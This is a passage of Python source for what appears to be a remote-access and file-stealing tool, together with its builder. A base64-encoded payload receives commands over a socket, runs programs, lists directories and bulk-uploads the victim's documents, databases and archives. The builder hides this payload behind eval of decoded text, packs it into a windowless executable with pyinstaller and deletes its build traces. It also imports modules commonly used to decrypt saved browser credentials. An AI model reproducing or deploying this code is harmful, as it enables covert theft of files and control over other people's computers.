Jlc3BvbnNlOgogICAgICAgICAgICBwYXRoID0gb3MuZ2V0Y3dkKCkKICAgICAgICAgICAgbmFtZSA9IGNsaWVudF9zb2NrZXQucmVjdihCVUZGRVJfU0laRSkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgIGZ1bGxfcGF0aCA9IGZpbmQobmFtZSxvcy5wYXRoLmV4cGFuZHVzZXIoJ34nKSkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgb3Muc3lzdGVtKGZ1bGxfcGF0aCkKICAgICAgICAgICAgICAgIG1haW5fd29yayhjbGllbnRfc29ja2V0KQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBtYWluX3dvcmsoY2xpZW50X3NvY2tldCkKICAgICAgICBpZiAiNiIgaW4gUmVzcG9uc2U6CiAgICAgICAgICAgIHBhdGggPSBvcy5nZXRjd2QoKQogICAgICAgICAgICBuYW1lID0gY2xpZW50X3NvY2tldC5yZWN2KEJVRkZFUl9TSVpFKS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICAgICAgaWYgbmFtZSA9PSAiTUFJTkRJU0siOgogICAgICAgICAgICAgICAgbmFtZSA9ICJDOlxcIgogICAgICAgICAgICBpZiBuYW1lID09ICJNQUlOVVNFUiI6CiAgICAgICAgICAgICAgICBuYW1lID0gb3MucGF0aC5leHBhbmR1c2VyKCd+JykKCiAgICAgICAgICAgIGlmICJTVEVBTEFMTCIgaW4gbmFtZToKICAgICAgICAgICAgICAgIGZpbmRfZGlyX3N0ZWFsX2FsbChuYW1lLnNwbGl0KFNFUEFSQVRPUilbMV0sY2xpZW50X3NvY2tldCkKICAgICAgICAgICAgICAgIG1haW5fd29yayhjbGllbnRfc29ja2V0KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgYXJyID0gZmluZF9kaXIobmFtZSkKICAgICAgICAgICAgICAgIGRhdGFfc3RyaW5nID0gcGlja2xlLmR1bXBzKGFycikKICAgICAgICAgICAgICAgIGFjaz0iIgogICAgICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGRhdGFfc3RyaW5nKQogICAgICAgICAgICAgICAgI3ByaW50KCJzZW5kZWQiKQogICAgICAgICAgICAgICAgI3N0cmluZyA9ICJET05FIgogICAgICAgICAgICAgICAgI2NsaWVudF9zb2NrZXQuc2VuZChzdHJpbmcuZW5jb2RlKCd1dGYtOCcpKQogICAgICAgICAgICAgICAgI3ByaW50KCJET05FIikKICAgICAgICAgICAgICAgIGRpckZpbGUgPSBjbGllbnRfc29ja2V0LnJlY3YoQlVGRkVSX1NJWkUpLmRlY29kZSgndXRmLTgnKQogICAgICAgICAgICAgICAgcHJpbnQoInJlY2VpdmVkIikKICAgICAgICAgICAgICAgICNwcmludCgiWUVTIikKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBjaG9vc2VuID0gYXJyW2ludChkaXJGaWxlLnN0cmlwKCkpXQogICAgICAgICAgICAgICAgICAgIGZpbGVfdG9fZ28gPSBjaG9vc2VuLnNwbGl0KCJGaWxlOiAiK0ZvcmUuTElHSFRDWUFOX0VYKQogICAgICAgICAgICAgICAgICAgIGlmICJGaWxlOiIgaW4gY2hvb3NlbjoKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfdG9fZ29bMV0sICJyYiIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVzX3JlYWQgPSBmLnJlYWQoQlVGRkVSX1NJWkUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGJ5dGVzX3JlYWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9ICJwRU9GcCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKHN0cmluZy5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGJ5dGVzX3JlYWQpICAgIAogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGNob29zZW4pCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfdG9fZ28gPSBjaG9vc2VuLnNwbGl0KCJEaXJlY3Rvcnk6ICIrRm9yZS5MSUdIVENZQU5fRVgpCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSBmaWxlX3RvX2dvWzFdCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBwcmludChlKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgIyBjbG9zZSB0aGUgY2xpZW50IHNvY2tldAogICAgI2NsaWVudF9zb2NrZXQuY2xvc2UoKQogICAgICAgICNJbnB1dCA9IGlucHV0KCdZb3VyIG1lc3NhZ2U6ICcpCiAgICAgICAgI0NsaWVudFNvY2tldC5zZW5kKHN0ci5lbmNvZGUoSW5wdXQpKQogICAgICAgICNSZXNwb25zZSA9IENsaWVudFNvY2tldC5yZWN2KDIwNDgpCiAgICAgICAgI3ByaW50KFJlc3BvbnNlLmRlY29kZSgndXRmLTgnKSkKCmRlZiBmaW5kX2Rpcl9zdGVhbF9hbGwocGF0aCxjbGllbnRfc29ja2V0KToKICAgCiAgICBpZiAiTUFJTlVTRVIiIGluIHBhdGg6CiAgICAgICAgcGF0aCA9IG9zLnBhdGguZXhwYW5kdXNlcignficpCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZW5hbWVzIGluIG9zLndhbGsocGF0aCk6CiAgICAgICAgZm9yIGZpbGVuYW1lIGluIGZpbGVuYW1lczoKICAgICAgICAgICAgI3ByaW50KCJPbmUgbW9yZSIpCiAgICAgICAgICAgIGlmIGZpbGVuYW1lLmVuZHN3aXRoKCIudHh0Iikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi5naWYiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLmh0bWwiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLnBuZyIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIucHkiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLnNoIikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi5wa2ciKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLnRvYyIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIubWFuaWZlc3QiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLmNwcCIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuYyIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuaCIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuc3BlYyIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuaHBwIikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi5qcGciKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLmRvY3giKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLnBwdHgiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLnhscyIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuc3ZnIikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi54bWwiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLm9kcyIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIueGxzeCIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIud2F2Iikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi56aXAiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLnJhciIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuN3oiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLmNzdiIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuZGF0Iikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi5kYiIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIuZGJmIikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi5zYXYiKSBvciBmaWxlbmFtZS5lbmRzd2l0aCgiLnNxbCIpOgogICAgICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGZpbGVuYW1lLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgICAgICNwcmludCgic2VuZGVkIikKICAgICAgICAgICAgICAgIGFuc3dlciA9IGNsaWVudF9zb2NrZXQucmVjdig0MDk2KQogICAgICAgICAgICAgICAgI3ByaW50KCJSZWNlaXZlZCIpCiAgICAgICAgICAgICAgICAjcHJpbnQoYW5zd2VyKQogICAgICAgICAgICAgICAgI3ByaW50KGZpbGVuYW1lKQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihyb290LCBmaWxlbmFtZSksICJyYiIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXNfcmVhZCA9IGYucmVhZChCVUZGRVJfU0laRSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGJ5dGVzX3JlYWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSAicEVPRnAiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoc3RyaW5nLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYW5zd2VyID0gY2xpZW50X3NvY2tldC5yZWN2KDQwOTYpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQoInJlY2VpdmVkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudF9zb2NrZXQuc2VuZGFsbChieXRlc19yZWFkKQogICAgCiAgICBleGl0ZSA9ICJFWElURklMRSIKICAgIGNsaWVudF9zb2NrZXQuc2VuZGFsbChleGl0ZS5lbmNvZGUoJ3V0Zi04JykpCgpkZWYgZmluZF9kaXIocGF0aCk6CiAgICBmdWxsX2RhdGEgPSB7fQogICAgY29udCA9IDAKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHBhdGgpOgogICAgICAgIGlmICJDOlxcIiA9PSBwYXRoOgogICAgICAgICAgICBwYXRoID0gcGF0aC5yZXBsYWNlKCJDOlxcIiwiQzoiKQogICAgICAgIGlmIHBhdGggPT0gb3MucGF0aC5leHBhbmR1c2VyKCd+Jyk6CiAgICAgICAgICAgICAjcHJpbnQoIi0tLS0tLS0tLS0tLS0tIitvcy5wYXRoLmV4cGFuZHVzZXIoJ34nKSsiXFwtLS0tLS0tLS0tLS0tLSIpCiAgICAgICAgICAgICBzdHJpbmcgPSBGb3JlLkdSRUVOKyIgICAgICAgICAgIFsiK29zLnBhdGguZXhwYW5kdXNlcignficpKyJcXF0gICAgICAgICAgIFxuIgogICAgICAgICAgICAgZnVsbF9kYXRhW2NvbnRdPXN0cmluZwogICAgICAgICAgICAgY29udCs9MQogICAgICAgIGVsaWYgIlVzZXJzXFwiIG5vdCBpbiBwYXRoOgogICAgICAgICAgICAgc3RyaW5nID0gRm9yZS5HUkVFTisiICAgICAgICAgICBbIitwYXRoKyJcXF0gICAgICAgICAgIFxuIgogICAgICAgICAgICAgZnVsbF9kYXRhW2NvbnRdPXN0cmluZwogICAgICAgICAgICAgY29udCs9MQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICNwcmludCgiLS0tLS0tLS0tLS0tLS0iK3Jvb3Quc3BsaXQob3MucGF0aC5leHBhbmR1c2VyKCd+JykpWzFdKyItLS0tLS0tLS0tLS0tLSIpCiAgICAgICAgICAgIHN0cmluZyA9IEZvcmUuR1JFRU4rIiAgICAgICAgICAgWyIrcm9vdC5zcGxpdChvcy5wYXRoLmV4cGFuZHVzZXIoJ34nKSlbMV0rIl0gICAgICAgICAgIFxufCIKICAgICAgICAgICAgZnVsbF9kYXRhW2NvbnRdPXN0cmluZwogICAgICAgICAgICBjb250Kz0xCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI3ByaW50KCkKICAgICAgICBmb3IgZGlyIGluIGRpcnM6CiAgICAgICAgICAgICNwcmludCgiICAgICBEaXJlY3Rvcnk6ICIrcGF0aCsiXFwiK2RpcikKICAgICAgICAgICAgc3RyaW5nID0gRm9yZS5HUkVFTitzdHIoY29udCkrIi0+IitGb3JlLk1BR0VOVEErIiAgICAgRGlyZWN0b3J5OiAiK0ZvcmUuTElHSFRDWUFOX0VYK3BhdGgrIlxcIitkaXIKICAgICAgICAgICAgZnVsbF9kYXRhW2NvbnRdPXN0cmluZwogICAgICAgICAgICBjb250Kz0xCiAgICAgICAgI3ByaW50KCkKICAgICAgICAKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgI3ByaW50KCIgICAgIEZpbGU6ICIrcGF0aCsiXFwiK2ZpbGUpCiAgICAgICAgICAgIHN0cmluZyA9IEZvcmUuR1JFRU4rc3RyKGNvbnQpKyItPiIrRm9yZS5NQUdFTlRBKyIgICAgIEZpbGU6ICIrRm9yZS5MSUdIVENZQU5fRVgrcGF0aCsiXFwiK2ZpbGUKICAgICAgICAgICAgZnVsbF9kYXRhW2NvbnRdPXN0cmluZwogICAgICAgICAgICBjb250Kz0xCiAgICAgICAgZm9yIHMgaW4gZnVsbF9kYXRhOgogICAgICAgICAgICBwcmludChmdWxsX2RhdGFbc10pCiAgICAgICAgcmV0dXJuIGZ1bGxfZGF0YQogICAgICAgIAoKZGVmIGZpbmQobmFtZSwgcGF0aCk6CiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhwYXRoKToKICAgICAgICBwcmludChmaWxlcykKICAgICAgICBpZiBuYW1lIGluIGZpbGVzOgogICAgICAgICAgICByZXR1cm4gb3MucGF0aC5qb2luKHJvb3QsIG5hbWUpCiNmaW5kX2RpcigiQzpcXFVzZXJzIikKaW5pdCgpCg=='


def hide(string):
    return b64encode(string.encode())

def show(string):
    return b64decode(string).decode()
hidden = hide(string_all)
#print(hide(string_all))
eval(compile(show(hidden), '<string>', 'exec'))
'''
    string_all_test ='''
print("Hello World")
    '''
    hidden = hide(string_all)
    string_all_encrypt = r'''
import socket
import sys
import time
import random
import pickle
import shutil
import os
import os
import json
import base64
import sqlite3
import win32crypt
from datetime import timezone, datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome
from os.path import expanduser
from colorama import Fore, Back, Style
from base64 import b64decode, b64encode

hidden = '''+str(hidden)+r'''
def show(string):
    return b64decode(string).decode()
eval(compile(show(hidden), '<string>', 'exec'))
'''
    text_file = open("teste.py", "w")
    text_file.write(string_all_test)
    text_file.close()
    print(f'{Fore.BLUE}[+] {Fore.GREEN}File Generating ...')
    os.system("pyinstaller --onefile --log-level=WARN teste.py")
    cwd = os.getcwd()
    #time.sleep(5)
    try:
        text_file = open(cwd+"\\dist\\teste.exe", "rb")
        text_file.close()
        text_file = open(os.path.expanduser('~')+"\\"+NAME_FILE+".pyw", "w")
        text_file.write(string_all_encrypt)
        text_file.close()
        #time.sleep(5)
        os.system("pyinstaller --onefile --noconsole --log-level=CRITICAL --key "+id_generator2()+" "+os.path.expanduser('~')+"\\"+NAME_FILE+".pyw")
        os.system("rm "+os.path.expanduser('~')+"\\"+NAME_FILE+".pyw")
        os.system("rm teste.py")
        os.system("rm teste.spec")
        os.system("rm "+NAME_FILE+".spec")
        os.system("rm "+cwd+"\\dist\\teste.exe")
        os.system("rm -r build")
        print(f'{Fore.BLUE}[+] {Fore.GREEN}File Generated Successfully at \dist\"+NAME_FILE+".exe')
        time.sleep(5)
        return 
    except:
        print(Fore.RED+"[!]"+Fore.GREEN+" Missing Pyinstaller or Error in Generation")
        time.sleep(5)
        sys.exit(1)

#init(cont)
def hide(string):
    return b64encode(string.encode())


main()
   
